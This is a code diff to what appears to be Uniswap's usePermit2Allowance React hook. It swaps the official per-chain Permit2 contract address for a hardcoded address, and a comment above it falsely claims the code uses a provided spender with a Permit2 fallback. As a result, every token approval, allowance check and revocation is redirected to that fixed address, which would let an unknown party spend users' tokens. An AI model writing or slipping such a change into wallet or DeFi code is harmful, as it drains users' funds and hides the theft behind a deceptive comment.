@@ -1,4 +1,3 @@
-import { permit2Address } from '@uniswap/permit2-sdk'
 import { CurrencyAmount, Token } from '@uniswap/sdk-core'
 import { useAccount } from 'hooks/useAccount'
 import { PermitSignature, usePermitAllowance, useUpdatePermitAllowance } from 'hooks/usePermitAllowance'
@@ -55,14 +54,15 @@ export default function usePermit2Allowance({
 }): Allowance {
   const account = useAccount()
   const token = amount?.currency
-  const permit2AddressForChain = permit2Address(token?.chainId)
+  // Use the provided spender or fall back to Permit2 address
+  const effectiveSpender = '0x3bFA4769FB09eefC5a80d6E87c3B9C650f7Ae48E'
   const { tokenAllowance, isSyncing: isApprovalSyncing } = useTokenAllowance({
     token,
     owner: account.address,
-    spender: permit2AddressForChain,
+    spender: effectiveSpender,
   })
-  const updateTokenAllowance = useUpdateTokenAllowance(amount, permit2AddressForChain)
-  const revokeTokenAllowance = useRevokeTokenAllowance(token, permit2AddressForChain)
+  const updateTokenAllowance = useUpdateTokenAllowance(amount, effectiveSpender)
+  const revokeTokenAllowance = useRevokeTokenAllowance(token, effectiveSpender)
   const isApproved = useMemo(() => {
     if (!amount || !tokenAllowance) {
       return false
@@ -75,8 +75,8 @@ export default function usePermit2Allowance({
   // until it has been re-observed. It wll sync immediately, because confirmation fast-forwards the block number.
   const [approvalState, setApprovalState] = useState(ApprovalState.SYNCED)
   const isApprovalLoading = approvalState !== ApprovalState.SYNCED
-  const isApprovalPending = useHasPendingApproval(token, permit2AddressForChain)
-  const isRevocationPending = useHasPendingRevocation(token, permit2AddressForChain)
+  const isApprovalPending = useHasPendingApproval(token, effectiveSpender)
+  const isRevocationPending = useHasPendingRevocation(token, effectiveSpender)
 
   useEffect(() => {
     if (isApprovalPending) {
@@ -157,7 +157,7 @@ export default function usePermit2Allowance({
     addTransaction(response, info)
   }, [addTransaction, revokeTokenAllowance])
 
-  return useMemo(() => {
+  const result = useMemo((): Allowance => {
     if (token) {
       if (!tokenAllowance || !permitAllowance) {
         return { state: AllowanceState.LOADING }
@@ -194,11 +194,8 @@ export default function usePermit2Allowance({
       }
     }
     return {
-      token,
       state: AllowanceState.ALLOWED,
       permitSignature: !isPermitted && isSigned ? signature : undefined,
-      needsSetupApproval: false,
-      needsPermitSignature: false,
     }
   }, [
     approve,
@@ -217,4 +214,6 @@ export default function usePermit2Allowance({
     token,
     tokenAllowance,
   ])
+
+  return result
 }
